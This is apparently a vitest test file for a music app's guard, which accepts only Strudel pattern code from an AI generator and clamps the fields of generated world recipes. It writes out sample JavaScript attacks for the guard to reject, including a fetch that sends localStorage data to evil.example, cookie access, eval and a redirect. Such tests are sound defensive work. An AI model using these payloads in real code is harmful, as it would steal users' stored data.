import { describe, expect, it } from 'vitest';
import { guardPattern, guardPatternMap } from '../../src/ai/PatternGuard';
import { RECIPE_LIMITS, validateRecipe } from '../../src/ai/WorldRecipe';

describe('PatternGuard (§30: generated code is pattern language or nothing)', () => {
  it('accepts real Strudel patterns', () => {
    for (const code of [
      's("bd*4").bank("RolandTR909").gain(0.8)',
      's("[bd <hh oh>]*2").bank("tr909").dec(.4)',
      'note("c2 eb2 g2").s("sawtooth").lpf(600).gain(0.5)',
      'stack(s("hh*8").gain(0.3), s("~ cp ~ cp").gain(0.5))',
      's("white").slow(4).lpf(1200).room(0.4).gain(0.2)',
    ]) {
      expect(guardPattern(code), code).toMatchObject({ ok: true });
    }
  });

  it('refuses everything that could become arbitrary JavaScript', () => {
    const attacks = [
      'fetch("https://evil.example/steal?k=" + localStorage.key)',
      's("bd"); window.location = "https://evil.example"',
      'eval("alert(1)")',
      's("bd").gain(() => document.cookie)',
      'new Function("return 1")()',
      's(`bd${globalThis}`)',
      'window.__FREQUENCY_DEBUG__.resetWorld()',
      's("bd").gain(0.5) = 1',
    ];
    for (const code of attacks) {
      expect(guardPattern(code), code).toMatchObject({ ok: false });
    }
  });

  it('keeps safe layers and drops unsafe ones instead of failing the world', () => {
    const { accepted, rejected } = guardPatternMap({
      drums: 's("bd*4").gain(0.8)',
      bass: 'fetch("https://evil.example")',
      melody: 42,
    });
    expect(Object.keys(accepted)).toEqual(['drums']);
    expect(rejected.map((r) => r.layer)).toEqual(['bass']);
  });
});

describe('validateRecipe (§30: unknown model output becomes trusted data)', () => {
  it('clamps every field and drops unsafe patterns', () => {
    const { recipe, rejected } = validateRecipe({
      name: 'x'.repeat(200),
      zones: { north: 'ambient', eastNorthEast: 'nonsense', south: 'bass', westSouthWest: 'techno' },
      resonators: [
        { angleDeg: 450, distance: 99999, hz: 999999, waveform: 'bogus' },
        ...Array.from({ length: 20 }, () => ({ angleDeg: 0, distance: 80, hz: 220, waveform: 'sine' })),
      ],
      fog: 42,
      forest: -3,
      bpm: 9000,
      patterns: { drums: 's("bd*4")', bass: 'window.alert(1)' },
    });
    expect(recipe.name.length).toBeLessThanOrEqual(RECIPE_LIMITS.maxNameLength);
    expect(recipe.zones.eastNorthEast).toBe('jazz'); // unknown genre falls back
    expect(recipe.resonators).toHaveLength(RECIPE_LIMITS.maxResonators);
    expect(recipe.resonators[0]!.angleDeg).toBe(90); // 450° wraps
    expect(recipe.resonators[0]!.distance).toBe(RECIPE_LIMITS.maxDistance);
    expect(recipe.resonators[0]!.hz).toBe(RECIPE_LIMITS.maxHz);
    expect(recipe.resonators[0]!.waveform).toBe('sine');
    expect(recipe.fog).toBe(1);
    expect(recipe.forest).toBe(0);
    expect(recipe.bpm).toBe(RECIPE_LIMITS.maxBpm);
    expect(recipe.patterns.drums).toBe('s("bd*4")');
    expect(recipe.patterns.bass).toBeUndefined();
    expect(rejected).toHaveLength(1);
  });

  it('never throws on garbage', () => {
    for (const junk of [null, 'nope', 42, [], {}]) {
      expect(() => validateRecipe(junk)).not.toThrow();
    }
    expect(validateRecipe(null).recipe.zones.north).toBe('techno');
  });
});
